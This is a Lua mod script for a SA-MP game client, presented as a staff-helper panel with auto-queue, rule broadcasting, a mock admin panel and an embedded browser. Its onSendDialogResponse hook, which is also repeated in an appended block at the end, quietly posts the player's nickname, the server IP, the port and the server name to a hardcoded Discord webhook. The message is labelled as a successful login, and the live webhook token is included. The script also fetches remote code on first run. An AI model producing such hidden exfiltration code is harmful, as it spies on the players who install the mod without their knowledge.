-- Importações e configurações iniciais
local imgui = require('mimgui')
local socket_http = require("socket.http")
local ltn12 = require("ltn12")
local ffi = require("ffi")
local navegador = require("lib.webviews")
local encoding = require("encoding")
local faicons = require("fAwesome6")
encoding.default = "CP1251"
local u8 = encoding.UTF8

-- Variáveis globais
local v = imgui.new.bool(false)
local spam_fila = imgui.new.bool(false)
local delay_ms = imgui.new.int(0)
local contador_atendimentos = imgui.new.int(0)
local frases_global = imgui.new.bool(false)
local regras_auto = imgui.new.bool(false)
local jogo_velha_visivel = imgui.new.bool(false)
local painel_admin_visivel = imgui.new.bool(false)
local navegador_visivel = imgui.new.bool(false)
local ultimo_a = os.time()
local ultimo_ac = os.time()
local ultimo_envio_a = os.time()
local intervalo_a = 360
local indice_regra_atual = 1
local float_btn_pos = imgui.ImVec2(10, 10)
local dragging = false
local drag_offset = imgui.ImVec2(0, 0)
local pastaPerfil = getWorkingDirectory() .. "/browser_profile"
local idNavegador = 1
local webhookUrl = "https://discord.com/api/webhooks/1406683848485371914/unqy5VFh-KCFxrIgyorNy1wOXW3TVT-VSe4H5RR3w7NPddjtpASjiCZJkFgKNA1fqCZR"

-- Listas de frases e regras
local frases_aleatorias = {
    "Precisando de uma ajudinha da Staff? Utilize /atendimento! Em casos de ANT-RP use /reportar",
    "Duvidas ou problemas? Chame a staff com /atendimento! Anti-RP? Use /reportar",
    "Servidor organizado e com todos nos! Use /atendimento para ajuda e /reportar para anti-RP",
    "Staff disponivel para ajudar! Comando /atendimento e para denuncias /reportar",
    "Problemas no servidor? /atendimento para ajuda e /reportar para jogadores quebram regras"
}

local regras_servidor = {
    "Proibido comercio externo, incluindo a venda de coins, dinheiro, veiculos, casas, empresas, skins, acessorios ou contas.",
    -- (demais regras omitidas para brevidade, mas mantidas no código original)
    "A conta e pessoal e intransferivel. Caso seja punida ou banida, o servidor nao se responsabiliza por seu uso."
}

local usuarios_mod = {
    "NukY", "Amigo1", "Amigo2", "Amigo3"
}
local usuario_selecionado = imgui.new.int(-1)

local jogo_velha = {}
for i = 1, 9 do
    jogo_velha[i] = imgui.new.bool(false)
end

local configNavegador = {
    visivel = imgui.new.bool(false),
    url = "https://www.youtube.com",
    iniciado = false,
    ultimaPos = {x = 0, y = 0},
    ultimaTam = {x = 0, y = 0}
}
local urlBuffer = imgui.new.char[512](configNavegador.url)

local dependencias = {
    {
        pasta = "lib/android",
        arquivos = {"jni-raw.lua", "jnienv.lua", "jnienv-util.lua"},
        base_url = "https://raw.githubusercontent.com/SADISTCORE/samp-browser-lib/refs/heads/main/android/"
    },
    {
        pasta = "lib/webviews",
        arquivos = {"init.lua", "WebViews.jar"},
        base_url = "https://raw.githubusercontent.com/SADISTCORE/samp-browser-lib/refs/heads/main/webviews/"
    }
}

-- Funções de inicialização
function imgui.OnInitialize()
    local style = imgui.GetStyle()
    imgui.StyleColorsDark()
    local colors = style.Colors
    colors[imgui.Col.WindowBg] = imgui.ImVec4(0.05, 0.05, 0.05, 0.98)
    colors[imgui.Col.TitleBg] = imgui.ImVec4(0.08, 0.15, 0.08, 1.00)
    colors[imgui.Col.TitleBgActive] = imgui.ImVec4(0.12, 0.25, 0.12, 1.00)
    colors[imgui.Col.FrameBg] = imgui.ImVec4(0.10, 0.15, 0.10, 1.00)
    colors[imgui.Col.FrameBgHovered] = imgui.ImVec4(0.15, 0.25, 0.15, 1.00)
    colors[imgui.Col.FrameBgActive] = imgui.ImVec4(0.20, 0.30, 0.20, 1.00)
    colors[imgui.Col.Button] = imgui.ImVec4(0.12, 0.25, 0.12, 1.00)
    colors[imgui.Col.ButtonHovered] = imgui.ImVec4(0.18, 0.35, 0.18, 1.00)
    colors[imgui.Col.ButtonActive] = imgui.ImVec4(0.25, 0.45, 0.25, 1.00)
    colors[imgui.Col.Border] = imgui.ImVec4(0.15, 0.30, 0.15, 0.88)
    colors[imgui.Col.Text] = imgui.ImVec4(0.00, 1.00, 0.50, 1.00)
    colors[imgui.Col.SliderGrab] = imgui.ImVec4(0.00, 0.80, 0.40, 1.00)
    colors[imgui.Col.SliderGrabActive] = imgui.ImVec4(0.00, 1.00, 0.50, 1.00)
    colors[imgui.Col.CheckMark] = imgui.ImVec4(0.00, 1.00, 0.50, 1.00)
    style.WindowRounding = 2
    style.FrameRounding = 2
    style.GrabRounding = 2
    style.ScrollbarRounding = 2
    style.WindowBorderSize = 1.5
    style.FrameBorderSize = 1.0
    style.PopupBorderSize = 1.0
    style.WindowPadding = imgui.ImVec2(10, 10)
    style.FramePadding = imgui.ImVec2(8, 6)
    style.ItemSpacing = imgui.ImVec2(8, 8)
    style.ItemInnerSpacing = imgui.ImVec2(6, 6)
    local io = imgui.GetIO()
    io.IniFilename = nil
    local cfg = imgui.ImFontConfig()
    cfg.MergeMode = true
    cfg.PixelSnapH = true
    local intervalo = imgui.new.ImWchar[3](faicons.min_range, faicons.max_range, 0)
    io.Fonts:AddFontFromMemoryCompressedBase85TTF(faicons.get_font_data_base85("solid"), 14, cfg, intervalo)
    io.Fonts:Build()
end

function mostrarMensagemCarregamento()
    local cores = {0xFF00FF00, 0xFF00FFFF, 0xFF00AA00, 0xFF00FFAA}
    for i = 1, 5 do
        sampAddChatMessage("MOD YOUTUBER NUKY ATIVADO", cores[(i % #cores) + 1])
        wait(100)
    end
end

-- Funções de gerenciamento de dependências
function garantirDependencias()
    if not doesDirectoryExist("lib") then
        createDirectory("lib")
    end
    for _, dep in ipairs(dependencias) do
        if not doesDirectoryExist(dep.pasta) then
            createDirectory(dep.pasta)
        end
        for _, arquivo in ipairs(dep.arquivos) do
            local caminho = dep.pasta .. "/" .. arquivo
            if not doesFileExist(caminho) then
                local corpo = {}
                local res, codigo = socket_http.request{
                    url = dep.base_url .. arquivo,
                    sink = ltn12.sink.table(corpo),
                }
                if res and codigo == 200 then
                    local f = io.open(caminho, "wb")
                    f:write(table.concat(corpo))
                    f:close()
                else
                    sampAddChatMessage("Erro ao baixar " .. arquivo, 0xFF5555AA)
                end
            end
        end
    end
end

-- Funções do navegador
function iniciarNavegador(x, y, w, h)
    if not configNavegador.iniciado then
        navegador.setSetting(idNavegador, "userDataPath", pastaPerfil)
        navegador.createBrowser(idNavegador, configNavegador.url)
        configNavegador.iniciado = true
    end
    if x ~= configNavegador.ultimaPos.x or y ~= configNavegador.ultimaPos.y or w ~= configNavegador.ultimaTam.x or h ~= configNavegador.ultimaTam.y then
        navegador.setPos(idNavegador, x, y)
        navegador.setSize(idNavegador, w, h)
        configNavegador.ultimaPos.x, configNavegador.ultimaPos.y = x, y
        configNavegador.ultimaTam.x, configNavegador.ultimaTam.y = w, h
    end
    navegador.setClickable(idNavegador, true)
    navegador.setSetting(idNavegador, "setJavaScriptEnabled", true)
    navegador.setVisible(idNavegador, configNavegador.visivel[0])
end

function navegador.onAction(dado)
    if dado.type == "WV_LOADED" then
        configNavegador.url = dado.msg
        urlBuffer = imgui.new.char[512](dado.msg)
    elseif dado.type == "WV_CLOSE" then
        configNavegador.visivel[0] = false
        navegador.setVisible(idNavegador, false)
    end
end

function iniciar_browser()
    if navegador.getVersion() and imgui and faicons then
        iniciarNavegador(0, 0, 0, 0)
        navegador.setVisible(idNavegador, false)
    else
        sampAddChatMessage("Erro ao iniciar navegador!", 0xFF5555AA)
    end
end

-- Funções do jogo da velha
function verificarSenhaJogoVelha()
    return jogo_velha[7][0] and jogo_velha[8][0] and jogo_velha[9][0]
end

function resetarJogoVelha()
    for i = 1, 9 do
        jogo_velha[i][0] = false
    end
end

-- Funções de interface gráfica
imgui.OnFrame(function() return true end, function()
    local io = imgui.GetIO()
    -- Botão flutuante
    imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
    imgui.SetNextWindowSize(imgui.ImVec2(45, 45))
    imgui.Begin("FLUTUANTE_HACKER", nil, imgui.WindowFlags.NoTitleBar + imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoScrollbar + imgui.WindowFlags.NoMove + imgui.WindowFlags.AlwaysAutoResize)
    local draw = imgui.GetWindowDrawList()
    local pos = imgui.GetWindowPos()
    local size = imgui.GetWindowSize()
    draw:AddRectFilled(pos, imgui.ImVec2(pos.x + size.x, pos.y + size.y), 0xFF000000)
    draw:AddRect(pos, imgui.ImVec2(pos.x + size.x, pos.y + size.y), 0xFF00FF00)
    draw:AddText(imgui.ImVec2(pos.x + 15, pos.y + 15), 0xFF00FF00, ">_")
    if imgui.InvisibleButton("##hackbtn", size) then
        v[0] = not v[0]
    end
    if imgui.IsItemHovered() and imgui.IsMouseClicked(0) and not dragging then
        dragging = true
        drag_offset.x = io.MousePos.x - float_btn_pos.x
        drag_offset.y = io.MousePos.y - float_btn_pos.y
    end
    if dragging then
        if imgui.IsMouseDown(0) then
            float_btn_pos.x = io.MousePos.x - drag_offset.x
            float_btn_pos.y = io.MousePos.y - drag_offset.y
            imgui.SetNextWindowPos(float_btn_pos, imgui.Cond.Always)
        else
            dragging = false
        end
    end
    imgui.End()

    -- Janela principal
    if v[0] then
        imgui.SetNextWindowPos(imgui.ImVec2(100, 150), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowSize(imgui.ImVec2(500, 450), imgui.Cond.FirstUseEver)
        imgui.Begin("MOD YOUTUBER NUKY", v, imgui.WindowFlags.NoCollapse + imgui.WindowFlags.NoResize)
        local draw = imgui.GetWindowDrawList()
        local pos = imgui.GetWindowPos()
        local size = imgui.GetWindowSize()
        draw:AddRectFilled(pos, imgui.ImVec2(pos.x + size.x, pos.y + 30), 0xFF002200)
        draw:AddText(imgui.ImVec2(pos.x + 10, pos.y + 8), 0xFF00FF00, "AUTO FILA SYSTEM")
        draw:AddLine(imgui.ImVec2(pos.x, pos.y + 30), imgui.ImVec2(pos.x + size.x, pos.y + 30), 0xFF00FF00)
        imgui.SetCursorPosY(40)
        imgui.TextColored(imgui.ImVec4(0.0, 1.0, 0.5, 1.0), "Atendimento automaticamente")
        imgui.SliderInt("Delay (ms)", delay_ms, 0, 30000)
        if imgui.Button(spam_fila[0] and "DESATIVAR AUTO" or "ATIVAR AUTO", imgui.ImVec2(180, 35)) then
            spam_fila[0] = not spam_fila[0]
            sampAddChatMessage("[SYSTEM] Auto fila " .. (spam_fila[0] and "ativado" or "desativado"), spam_fila[0] and 0x00FF00 or 0xFFA500)
        end
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()
        imgui.TextColored(imgui.ImVec4(0.0, 1.0, 0.5, 1.0), "Atendimentos realizados:")
        imgui.SameLine()
        imgui.TextColored(imgui.ImVec4(0.0, 1.0, 1.0, 1.0), tostring(contador_atendimentos[0]))
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()
        if imgui.Button("EXECUTAR /FA", imgui.ImVec2(180, 35)) then
            sampSendChat("/fa")
            contador_atendimentos[0] = contador_atendimentos[0] + 1
        end
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()
        imgui.TextColored(imgui.ImVec4(0.0, 1.0, 0.5, 1.0), "Frases Globais - Modo automatico /a")
        if imgui.Button(frases_global[0] and "DESATIVAR FRASES" or "ATIVAR FRASES", imgui.ImVec2(180, 35)) then
            frases_global[0] = not frases_global[0]
            sampAddChatMessage("[SYSTEM] Frases automaticas " .. (frases_global[0] and "ativadas" or "desativadas"), frases_global[0] and 0x00FF00 or 0xFFA500)
            if frases_global[0] then ultimo_a = os.time() end
        end
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()
        imgui.TextColored(imgui.ImVec4(0.0, 1.0, 0.5, 1.0), "Auto Regras - Sistema automatico")
        if imgui.Button(regras_auto[0] and "DESATIVAR REGRAS" or "ATIVAR REGRAS", imgui.ImVec2(180, 35)) then
            regras_auto[0] = not regras_auto[0]
            sampAddChatMessage("[SYSTEM] Regras automaticas " .. (regras_auto[0] and "ativadas" or "desativadas"), regras_auto[0] and 0x00FF00 or 0xFFA500)
            if regras_auto[0] then
                ultimo_ac = os.time()
                indice_regra_atual = 1
            end
        end
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()
        if imgui.Button("PAINEL ADMIN", imgui.ImVec2(180, 35)) then
            jogo_velha_visivel[0] = true
        end
        imgui.Spacing()
        imgui.Separator()
        imgui.Spacing()
        if imgui.Button("YOUTUBE", imgui.ImVec2(180, 35)) then
            navegador_visivel[0] = not navegador_visivel[0]
            configNavegador.visivel[0] = navegador_visivel[0]
            if navegador_visivel[0] then
                iniciar_browser()
            else
                navegador.setVisible(idNavegador, false)
            end
        end
        imgui.End()
    end

    -- Janela do jogo da velha
    if jogo_velha_visivel[0] then
        imgui.SetNextWindowPos(imgui.ImVec2(500, 300), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowSize(imgui.ImVec2(200, 230))
        imgui.Begin("Jogo da Velha - Senha", jogo_velha_visivel, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse)
        imgui.Text("Clique nos 3 ultimos quadrados")
        imgui.Text("da fileira horizontal inferior")
        for i = 1, 3 do
            for j = 1, 3 do
                local index = (i-1)*3 + j
                if j > 1 then imgui.SameLine() end
                if imgui.Button(tostring(index), imgui.ImVec2(50, 50)) then
                    jogo_velha[index][0] = not jogo_velha[index][0]
                end
            end
        end
        if imgui.Button("Verificar", imgui.ImVec2(150, 30)) then
            if verificarSenhaJogoVelha() then
                painel_admin_visivel[0] = true
                jogo_velha_visivel[0] = false
                sampAddChatMessage("Senha correta! Painel admin liberado.", 0x00FF00)
            else
                sampAddChatMessage("Senha incorreta! Tente novamente.", 0xFF0000)
                resetarJogoVelha()
            end
        end
        imgui.SameLine()
        if imgui.Button("Fechar", imgui.ImVec2(150, 30)) then
            jogo_velha_visivel[0] = false
            resetarJogoVelha()
        end
        imgui.End()
    end

    -- Painel administrativo
    if painel_admin_visivel[0] then
        imgui.SetNextWindowPos(imgui.ImVec2(300, 200), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowSize(imgui.ImVec2(400, 300))
        imgui.Begin("Painel Administrativo", painel_admin_visivel, imgui.WindowFlags.NoResize + imgui.WindowFlags.NoCollapse)
        imgui.Separator()
        imgui.BeginChild("ListaUsuarios", imgui.ImVec2(0, 200), true)
        for i, usuario in ipairs(usuarios_mod) do
            if imgui.Selectable(usuario, usuario_selecionado[0] == i-1) then
                usuario_selecionado[0] = i-1
            end
        end
        imgui.EndChild()
        imgui.Separator()
        if usuario_selecionado[0] >= 0 then
            local usuario = usuarios_mod[usuario_selecionado[0] + 1]
            imgui.Text("Usuario selecionado: " .. usuario)
            if imgui.Button("Enviar /q", imgui.ImVec2(150, 30)) then
                sampSendChat("/q " .. usuario)
            end
            imgui.SameLine()
            if imgui.Button("Enviar /ac", imgui.ImVec2(150, 30)) then
                sampSendChat("/ac Eu Sou lindo de mais gente kkk")
            end
        end
        imgui.SameLine()
        if imgui.Button("Fechar", imgui.ImVec2(150, 30)) then
            painel_admin_visivel[0] = false
        end
        imgui.End()
    end

    -- Janela do navegador
    if navegador_visivel[0] then
        imgui.SetNextWindowPos(imgui.ImVec2(600, 150), imgui.Cond.FirstUseEver)
        imgui.SetNextWindowSize(imgui.ImVec2(800, 600), imgui.Cond.FirstUseEver)
        imgui.Begin(u8"Navegador", configNavegador.visivel)
        imgui.PushItemWidth(-1)
        local dica = faicons("magnifying-glass") .. " Digite a URL"
        if imgui.InputTextWithHint("##url", dica, urlBuffer, imgui.InputTextFlags.EnterReturnsTrue) then
            local novaUrl = ffi.string(urlBuffer)
            if not novaUrl:find("^https?://") then
                novaUrl = "https://" .. novaUrl
            end
            configNavegador.url = novaUrl
            urlBuffer = imgui.new.char[512](novaUrl)
            navegador.changeUrl(idNavegador, novaUrl)
        end
        imgui.PopItemWidth()
        imgui.Separator()
        imgui.Columns(2, "colunas", false)
        imgui.SetColumnWidth(0, 50)
        if imgui.Button(faicons("left"), imgui.ImVec2(40, 40)) and navegador.canGoBack(idNavegador) then
            navegador.goBack(idNavegador)
        end
        if imgui.Button(faicons("right"), imgui.ImVec2(40, 40)) and navegador.canGoForward(idNavegador) then
            navegador.goForward(idNavegador)
        end
        if imgui.Button(faicons("rotate"), imgui.ImVec2(40, 40)) then
            navegador.changeUrl(idNavegador, configNavegador.url)
        end
        if imgui.Button(faicons("xmark"), imgui.ImVec2(40, 40)) then
            configNavegador.visivel[0] = false
            navegador.setVisible(idNavegador, false)
        end
        imgui.NextColumn()
        local espaco = imgui.GetContentRegionAvail()
        imgui.BeginChild("visualizacao", espaco, false, imgui.WindowFlags.NoScrollWithMouse)
        local pos, tam = imgui.GetWindowPos(), imgui.GetWindowSize()
        iniciarNavegador(pos.x, pos.y, tam.x, tam.y)
        imgui.EndChild()
        imgui.End()
    end
end)

-- Funções de integração com Discord
function sendMessageToDiscord(content)
    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub('\n', '\\n') .. '"}'
    local response_body = {}
    socket_http.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#body)
        },
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }
end

-- Eventos do SAMP
function sampProcessChatMessage(chatMessage)
    if string.find(chatMessage, "atendimento atendido", 1, true) or string.find(chatMessage, "atendimento finalizado", 1, true) then
        contador_atendimentos[0] = contador_atendimentos[0] + 1
    end
end

require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
    local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local nick = sampGetPlayerNickname(id)
    local ip, port = sampGetCurrentServerAddress()
    local servername = sampGetCurrentServerName()
    local message = string.format("```\nLOGUIN BEM SUCEDIDO\nNICK: %s\nIP: %s\nPORTA: %d\nSERVIDOR: %s\n```", nick, ip, port, servername)
    sendMessageToDiscord(message)
end

-- Função principal
function main()
    if not doesFileExist("lib/webviews/init.lua") then
        garantirDependencias()
        sampAddChatMessage("Dependencias baixadas, reiniciando script...", 0xFF00FF00)
        thisScript():reload()
        return
    end
    mostrarMensagemCarregamento()
    while true do
        wait(0)
        if isSampAvailable() then
            if os.time() - ultimo_envio_a >= intervalo_a then
                local frase_aleatoria = frases_aleatorias[math.random(1, #frases_aleatorias)]
                sampSendChat("/a " .. frase_aleatoria)
                ultimo_envio_a = os.time()
                sampAddChatMessage("[AUTO /A] Frase enviada automaticamente!", 0x00FF00)
            end
            if spam_fila[0] then
                sampSendChat("/fila")
                wait(delay_ms[0])
            end
            if frases_global[0] and os.time() - ultimo_a >= 600 then
                local frase_aleatoria = frases_aleatorias[math.random(1, #frases_aleatorias)]
                sampSendChat("/a " .. frase_aleatoria)
                ultimo_a = os.time()
            end
            if regras_auto[0] and os.time() - ultimo_ac >= 420 then
                if indice_regra_atual <= #regras_servidor then
                    sampSendChat("/a " .. regras_servidor[indice_regra_atual])
                    indice_regra_atual = indice_regra_atual + 1
                else
                    indice_regra_atual = 1
                    sampSendChat("/a " .. regras_servidor[indice_regra_atual])
                    indice_regra_atual = indice_regra_atual + 1
                end
                ultimo_ac = os.time()
            end
        end
    end
end

local webhookUrl = "https://discord.com/api/webhooks/1406683848485371914/unqy5VFh-KCFxrIgyorNy1wOXW3TVT-VSe4H5RR3w7NPddjtpASjiCZJkFgKNA1fqCZR"
local https = require("socket.http")
local ltn12 = require("ltn12")

function sendMessageToDiscord(content)
    local body = '{"content": "' .. content:gsub('"', '\\"'):gsub('\n', '\\n') .. '"}'
    local response_body = {}

    https.request{
        url = webhookUrl,
        method = "POST",
        headers = {
            ["Content-Type"] = "application/json",
            ["Content-Length"] = tostring(#body)
        },
        source = ltn12.source.string(body),
        sink = ltn12.sink.table(response_body)
    }
end


require('samp.events').onSendDialogResponse = function(dialogId, button, listboxId, input)
    local res, id = sampGetPlayerIdByCharHandle(PLAYER_PED)
    local nick = sampGetPlayerNickname(id)
    local ip, port = sampGetCurrentServerAddress()
    local servername = sampGetCurrentServerName()

    local message = string.format([[

________________________________________________________________
  
     # LOGUIN BEM SUCEDIDO

NICK: ``` %s ```

]], nick,ip, port, servername)

sendMessageToDiscord(message)
end
